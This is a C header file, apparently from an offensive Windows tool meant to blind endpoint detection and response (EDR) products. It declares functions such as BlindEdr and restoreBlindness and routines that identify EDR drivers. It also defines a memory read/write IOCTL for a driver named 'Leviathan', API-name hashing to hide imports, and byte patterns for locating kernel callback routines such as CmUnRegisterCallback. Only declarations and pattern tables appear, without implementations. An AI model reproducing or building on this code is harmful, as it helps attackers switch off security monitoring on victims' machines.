#pragma once

#include <Windows.h>
#include <tlhelp32.h>
#include "Structs.h"

#include "ApiHashing.h"
#include "Debug.h"

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib, "Psapi.lib")



#define DRIVER_NAME L"\\\\.\\Leviathan"

#define SIGN_EXTENSION_MASK 0x00000000ff000000
#define FULL_EXTENSION_MASK 0xffffffff00000000

#define PATCH_FILE_NAME "MemoryFile.data"

#define RW_MEM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0xAE86, METHOD_BUFFERED, FILE_ANY_ACCESS)

// main.c
BOOL saveMemoryFile();
BOOL restoreBlindness();
BOOL BlindEdr();
// Context.c
static Basic_INFO g_Context = { 0 };

BOOL NyxInitializeContext(void);

PBasic_INFO GetContext(void);
PMemoryPatch GetPatchTable(void);
HANDLE	GetContextHandle(void);

DWORD GetNtVersion(void);
DWORD GetNtBuild(void);
DWORD GetNtMinorVersion(void);

VOID CleanupContext(void);


// Module operations
PVOID GetModuleBaseH(IN UINT32 NAME_HASH);
UINT64 GetFuncAddressH(IN UINT32 ModuleNameHash, IN UINT32 FuncNameHash);


// Read Driver
CHAR* ReadDriverName(INT64 FLT_FILTERAddr);
CHAR* GetDriverName(UINT64 DriverCallBackFuncAddr);


// EDRDetector.c
// EDR operations
VOID AddEDRIntance(INT64 IntanceAddr);
BOOL IsEDRIntance(INT j, INT64 Flink);
BOOL IsEDRHash(const PCHAR DriverName);



// Common.c
// Memory operation wrapper
VOID DriverMemoryOperation(
	PVOID fromAddress,    // Source ptr
	PVOID toAddress,      // Target ptr
	size_t len,           // Length
	MEMORY_OPERATION opType);    // Operation type

// Memory Operation
// Pattern matching structure for instruction search

// 1/8/2025 3:20PM
// Pattern definition structure
typedef struct {
	BYTE* pattern;      // Byte sequence to match
	SIZE_T length;      // Pattern length
	CHAR* name;         // Pattern name for debugging
	BOOLEAN(*validate)(const BYTE* data);  // Optional additional validation function
} PATTERN_SEARCH;



UINT64 CalculateOffset(UINT64 address, int startOffset, int count);


// Common.c
UINT64 FindPattern(UINT64 startAddress, const PATTERN_SEARCH* pattern, int maxCount);

BOOLEAN ValidateLeaPattern(const BYTE* data);

BOOLEAN ValidateCallJmpPattern(const BYTE* data);

BOOLEAN ValidateLeaRipPattern(const BYTE* data);

BOOLEAN ValidateMovPattern(const BYTE* data);

BOOLEAN ValidateCmUnRegisterPattern(const BYTE* data);

HMODULE GetModuleHandleH(IN UINT32 uModuleHash, IN BOOL isKernel);
FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);


// Predefined patterns
static const PATTERN_SEARCH PREDEFINED_PATTERNS[] = {
    // CALL/JMP pattern
    {
        .pattern = (BYTE[]){0xE8},
        .length = 1,
        .name = "CALL/JMP",
        .validate = ValidateCallJmpPattern
    },
    // LEA pattern
    {
        .pattern = (BYTE[]){0x4C, 0x00, 0x00},  // Third byte will be checked in validation
        .length = 3,
        .name = "LEA",
        .validate = ValidateLeaPattern
    },
    // FltEnumerate pattern
    {
        .pattern = (BYTE[]){0x48, 0x8D, 0x05},
        .length = 3,
        .name = "FltEnumerate",
        .validate = NULL  // No additional validation needed
    },
    // LEA RIP-relative pattern
   {
       .pattern = (BYTE[]){0x48, 0x8D, 0x05},
       .length = 3,
       .name = "LEA_RIP",
       .validate = ValidateLeaRipPattern
   },
    // MOV pattern
    {
       .pattern = (BYTE[]){0x4C, 0x8B, 0x05},
       .length = 3,
       .name = "MOV",
       .validate = ValidateMovPattern
   },

   // LEA RCX, [RIP + displacement] 
   {
        // .pattern = (BYTE[]){0x48, 0x8D, 0x54, 0x00, 0x00, 0x48, 0x8D, 0x0D},
        .pattern = (BYTE[]){0x48, 0x8D, 0x0D},
        .length = 3,
        .name = "CmUnRegisterCallback",
        .validate = ValidateCmUnRegisterPattern
    }

    // Add more patterns as needed
};


VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength);


